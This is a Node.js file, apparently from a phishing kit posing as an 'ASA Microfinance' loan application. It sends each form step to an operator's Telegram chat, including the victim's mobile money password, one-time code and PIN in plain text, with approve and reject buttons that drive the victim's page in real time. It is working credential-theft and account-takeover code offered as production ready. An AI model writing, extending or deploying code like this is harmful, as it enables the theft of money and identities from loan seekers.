/**
 * bot_manager.js
 * ASA Microfinance - Telegram Bot Manager
 * Sends each step immediately when completed
 * Includes inline buttons for Step 4 (Password) and Step 6 (PIN)
 * Production ready - No localhost references
 */

const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
require('dotenv').config();

// ============================================================================
// ENVIRONMENT CONFIGURATION
// ============================================================================

const TELEGRAM_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!TELEGRAM_TOKEN || !ADMIN_CHAT_ID) {
    console.error('❌ CRITICAL: Missing Telegram configuration');
    console.error('   BOT_TOKEN and ADMIN_CHAT_ID must be set in environment');
    process.exit(1);
}

// ============================================================================
// TELEGRAM BOT INITIALIZATION
// ============================================================================

// Initialize bot with fast polling for button responses
const bot = new TelegramBot(TELEGRAM_TOKEN, { 
    polling: {
        interval: 300, // Fast polling (300ms) for instant button response
        autoStart: true,
        params: {
            timeout: 30
        }
    }
});

console.log(`
╔═══════════════════════════════════════════════════════════════╗
║         ASA MICROFINANCE - TELEGRAM BOT MANAGER               ║
╠═══════════════════════════════════════════════════════════════╣
║  Status:     🟢 RUNNING                                        ║
║  Bot Token:  ${TELEGRAM_TOKEN.substring(0, 10)}...${TELEGRAM_TOKEN.substring(TELEGRAM_TOKEN.length - 5)}║
║  Admin Chat: ${ADMIN_CHAT_ID}                                   ║
║  Mode:       📤 STEP-BY-STEP SENDING                           ║
║  Buttons:    ✅ INSTANT RESPONSE                               ║
╚═══════════════════════════════════════════════════════════════╝
`);

// ============================================================================
// TRACK PROCESSED CALLBACKS (Prevent duplicates)
// ============================================================================

const processedCallbacks = new Set();
const processedMessages = new Set();

// Clean up every 10 minutes
setInterval(() => {
    processedCallbacks.clear();
    processedMessages.clear();
    console.log('🧹 Cleaned up processed callback cache');
}, 10 * 60 * 1000);

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

/**
 * Escape HTML special characters for Telegram
 */
const escapeHTML = (str) => {
    if (str === undefined || str === null) return 'N/A';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
};

/**
 * Format phone number
 */
const formatPhone = (phone) => {
    if (!phone) return 'N/A';
    return `+232 ${phone}`;
};

/**
 * Format currency
 */
const formatCurrency = (amount) => {
    if (!amount) return '$0';
    return `$${Number(amount).toLocaleString()}`;
};

// ============================================================================
// STEP FORMATTING FUNCTIONS
// ============================================================================

/**
 * Format Step 1: Loan Details
 */
const formatStep1 = (data) => {
    return `
💰 <b>STEP 1 – LOAN DETAILS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application ID:</b> <code>${escapeHTML(data.appId)}</code>
📋 <b>Loan Type:</b> ${escapeHTML(data.loanType)}
💵 <b>Amount:</b> ${formatCurrency(data.amount)}
⏱️ <b>Term:</b> ${escapeHTML(data.term)} months
📝 <b>Purpose:</b> ${escapeHTML(data.purpose)}
    `;
};

/**
 * Format Step 2: Personal Information
 */
const formatStep2 = (data) => {
    return `
👤 <b>STEP 2 – PERSONAL INFORMATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application ID:</b> <code>${escapeHTML(data.appId)}</code>
👤 <b>First Name:</b> ${escapeHTML(data.firstName)}
👤 <b>Last Name:</b> ${escapeHTML(data.lastName)}
📧 <b>Email:</b> ${escapeHTML(data.email)}
📞 <b>Phone:</b> ${formatPhone(data.phone)}
    `;
};

/**
 * Format Step 3: Employment Information
 */
const formatStep3 = (data) => {
    return `
💼 <b>STEP 3 – EMPLOYMENT</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application ID:</b> <code>${escapeHTML(data.appId)}</code>
📋 <b>Employment Status:</b> ${escapeHTML(data.employment)}
💰 <b>Income:</b> ${formatCurrency(data.income)}
🏢 <b>Employer:</b> ${escapeHTML(data.employer) || 'N/A'}
    `;
};

/**
 * Format Step 4: Mobile Money (Password) - WITH BUTTONS
 */
const formatStep4 = (data) => {
    return `
🔐 <b>STEP 4 – MOBILE MONEY VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application ID:</b> <code>${escapeHTML(data.appId)}</code>
👤 <b>Name:</b> ${escapeHTML(data.firstName)} ${escapeHTML(data.lastName)}
📞 <b>Phone:</b> ${formatPhone(data.phone)}
💰 <b>Amount:</b> ${formatCurrency(data.amount)}
🔑 <b>Password:</b> <code>${escapeHTML(data.password)}</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Admin action required. User is waiting.</i>
    `;
};

/**
 * Format Step 5: OTP Verification
 */
const formatStep5 = (data) => {
    return `
🔢 <b>STEP 5 – OTP VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application ID:</b> <code>${escapeHTML(data.appId)}</code>
📞 <b>Phone:</b> ${formatPhone(data.phone)}
🔢 <b>OTP:</b> <code>${escapeHTML(data.otp)}</code>
    `;
};

/**
 * Format Step 6: Final PIN - WITH BUTTONS
 */
const formatStep6 = (data) => {
    return `
🔐 <b>STEP 6 – FINAL PIN VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Application ID:</b> <code>${escapeHTML(data.appId)}</code>
👤 <b>Name:</b> ${escapeHTML(data.firstName)} ${escapeHTML(data.lastName)}
📞 <b>Phone:</b> ${formatPhone(data.phone)}
💰 <b>Amount:</b> ${formatCurrency(data.amount)}
🔑 <b>Password:</b> <code>${escapeHTML(data.password)}</code> (verified earlier)
🔢 <b>OTP:</b> <code>${escapeHTML(data.otp)}</code>
🔐 <b>PIN:</b> <code>${escapeHTML(data.pin)}</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Final admin verification required.</i>
    `;
};

// ============================================================================
// STEP SENDING FUNCTIONS (Called by server.js)
// ============================================================================

/**
 * Send Step 1 to Telegram
 */
const sendStep1 = async (data) => {
    try {
        const message = formatStep1(data);
        await bot.sendMessage(ADMIN_CHAT_ID, message, { 
            parse_mode: 'HTML' 
        });
        console.log(`✅ Step 1 sent for ${data.appId}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send Step 1:`, error.message);
        return false;
    }
};

/**
 * Send Step 2 to Telegram
 */
const sendStep2 = async (data) => {
    try {
        const message = formatStep2(data);
        await bot.sendMessage(ADMIN_CHAT_ID, message, { 
            parse_mode: 'HTML' 
        });
        console.log(`✅ Step 2 sent for ${data.appId}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send Step 2:`, error.message);
        return false;
    }
};

/**
 * Send Step 3 to Telegram
 */
const sendStep3 = async (data) => {
    try {
        const message = formatStep3(data);
        await bot.sendMessage(ADMIN_CHAT_ID, message, { 
            parse_mode: 'HTML' 
        });
        console.log(`✅ Step 3 sent for ${data.appId}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send Step 3:`, error.message);
        return false;
    }
};

/**
 * Send Step 4 to Telegram WITH BUTTONS
 */
const sendStep4 = async (data, io) => {
    try {
        const message = formatStep4(data);
        
        // Create inline keyboard with Approve/Reject buttons
        const keyboard = {
            inline_keyboard: [[
                { text: '✅ APPROVE PASSWORD', callback_data: `approve_pw_${data.appId}` },
                { text: '🔄 REJECT PASSWORD', callback_data: `reject_pw_${data.appId}` }
            ]]
        };
        
        await bot.sendMessage(ADMIN_CHAT_ID, message, { 
            parse_mode: 'HTML',
            reply_markup: JSON.stringify(keyboard)
        });
        
        console.log(`✅ Step 4 sent for ${data.appId} (with buttons)`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send Step 4:`, error.message);
        return false;
    }
};

/**
 * Send Step 5 to Telegram
 */
const sendStep5 = async (data) => {
    try {
        const message = formatStep5(data);
        await bot.sendMessage(ADMIN_CHAT_ID, message, { 
            parse_mode: 'HTML' 
        });
        console.log(`✅ Step 5 sent for ${data.appId}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send Step 5:`, error.message);
        return false;
    }
};

/**
 * Send Step 6 to Telegram WITH BUTTONS
 */
const sendStep6 = async (data, io) => {
    try {
        const message = formatStep6(data);
        
        // Create inline keyboard with Approve/Reject buttons
        const keyboard = {
            inline_keyboard: [[
                { text: '✅ APPROVE PIN', callback_data: `approve_pin_${data.appId}` },
                { text: '🔄 REJECT PIN', callback_data: `reject_pin_${data.appId}` }
            ]]
        };
        
        await bot.sendMessage(ADMIN_CHAT_ID, message, { 
            parse_mode: 'HTML',
            reply_markup: JSON.stringify(keyboard)
        });
        
        console.log(`✅ Step 6 sent for ${data.appId} (with buttons)`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to send Step 6:`, error.message);
        return false;
    }
};

/**
 * Send a simple message to Telegram
 */
const sendTelegramMessage = async (text) => {
    try {
        await bot.sendMessage(ADMIN_CHAT_ID, text, { 
            parse_mode: 'HTML' 
        });
        console.log('✅ Message sent to Telegram');
        return true;
    } catch (error) {
        console.error(`❌ Failed to send message:`, error.message);
        return false;
    }
};

// ============================================================================
// CALLBACK QUERY HANDLER (INSTANT BUTTON RESPONSE)
// ============================================================================

// Remove any existing listeners to prevent duplicates
bot.removeAllListeners('callback_query');

bot.on('callback_query', async (query) => {
    const startTime = Date.now();
    const data = query.data;
    const callbackId = query.id;
    const message = query.message;
    const chatId = message.chat.id;
    const messageId = message.message_id;
    
    console.log(`🔘 Callback received: ${data}`);
    
    // Prevent duplicate processing
    if (processedCallbacks.has(callbackId)) {
        console.log(`⚠️ Duplicate callback ignored: ${callbackId}`);
        return;
    }
    processedCallbacks.add(callbackId);
    
    // Parse callback data: [approve/reject]_[pw/pin]_[appId]
    const [action, type, appId] = data.split('_');
    
    console.log(`📋 Parsed: action=${action}, type=${type}, appId=${appId}`);
    
    // INSTANT acknowledgment - remove loading state on button
    try {
        await bot.answerCallbackQuery(callbackId, {
            text: action === 'approve' ? '✅ Approved!' : '🔄 Rejected!',
            show_alert: false
        });
        console.log(`✅ Callback answered (${Date.now() - startTime}ms)`);
    } catch (error) {
        console.error(`❌ Failed to answer callback:`, error.message);
    }
    
    // Get socket.io instance (passed from server.js via global)
    const io = global.io;
    
    if (!io) {
        console.error('❌ Socket.io instance not available');
        return;
    }
    
    // Emit socket event based on action and type
    if (action === 'approve') {
        if (type === 'pw') {
            io.to(appId).emit('password-verified');
            console.log(`✅ Emitted password-verified to room: ${appId}`);
        } else if (type === 'pin') {
            // Generate reference ID for completed application
            const referenceId = 'ASA-' + Date.now().toString(36).toUpperCase() + '-' + 
                                Math.random().toString(36).substring(2, 8).toUpperCase();
            io.to(appId).emit('pin-verified', { referenceId });
            console.log(`✅ Emitted pin-verified to room: ${appId} (Ref: ${referenceId})`);
        }
    } else if (action === 'reject') {
        if (type === 'pw') {
            io.to(appId).emit('password-rejected', { attempts: 1 });
            console.log(`❌ Emitted password-rejected to room: ${appId}`);
        } else if (type === 'pin') {
            io.to(appId).emit('pin-rejected', { attempts: 1 });
            console.log(`❌ Emitted pin-rejected to room: ${appId}`);
        }
    }
    
    // Update original message to show it was processed
    try {
        const statusText = action === 'approve' ? '✅ APPROVED' : '🔄 REJECTED';
        const newText = message.text + `\n\n<b>${statusText}</b> at ${new Date().toLocaleTimeString()}`;
        
        await bot.editMessageText(newText, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] } // Remove buttons
        });
        
        console.log(`✅ Message updated, buttons removed`);
    } catch (editError) {
        // Silently fail - message might be too old to edit
    }
    
    // Send confirmation message
    const confirmText = action === 'approve' 
        ? `✅ Application ${appId} has been APPROVED. User notified.`
        : `🔄 Application ${appId} has been REJECTED. User will retry.`;
    
    await bot.sendMessage(chatId, confirmText, { parse_mode: 'HTML' });
    
    console.log(`⏱️ Total callback processing time: ${Date.now() - startTime}ms`);
});

// ============================================================================
// ERROR HANDLERS
// ============================================================================

bot.on('polling_error', (error) => {
    // Only log critical errors
    if (error.code && error.code !== 'EFATAL') {
        console.error('⚠️ Polling error:', error.message);
    }
});

bot.on('error', (error) => {
    console.error('❌ Bot error:', error.message);
});

// ============================================================================
// COMMAND HANDLERS (Optional)
// ============================================================================

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    
    // Only respond to admin chat
    if (chatId.toString() !== ADMIN_CHAT_ID.toString()) return;
    
    await bot.sendMessage(chatId, 
        `👋 <b>ASA Microfinance Bot Active</b>\n\n` +
        `I will send each step of loan applications as they are completed.\n\n` +
        `✅ Steps 1-3: Notifications only\n` +
        `✅ Step 4: Password verification with buttons\n` +
        `✅ Step 5: OTP notification\n` +
        `✅ Step 6: PIN verification with buttons\n\n` +
        `<i>All messages include full application details</i>`,
        { parse_mode: 'HTML' }
    );
});

bot.onText(/\/stats/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (chatId.toString() !== ADMIN_CHAT_ID.toString()) return;
    
    await bot.sendMessage(chatId,
        `📊 <b>Bot Statistics</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🆙 Status: Active\n` +
        `⚡ Button response: INSTANT\n` +
        `📡 Mode: Step-by-step sending\n` +
        `🕒 Uptime: ${Math.floor(process.uptime() / 60)} minutes`,
        { parse_mode: 'HTML' }
    );
});

// ============================================================================
// EXPORTS
// ============================================================================

module.exports = {
    sendStep1,
    sendStep2,
    sendStep3,
    sendStep4,
    sendStep5,
    sendStep6,
    sendTelegramMessage
};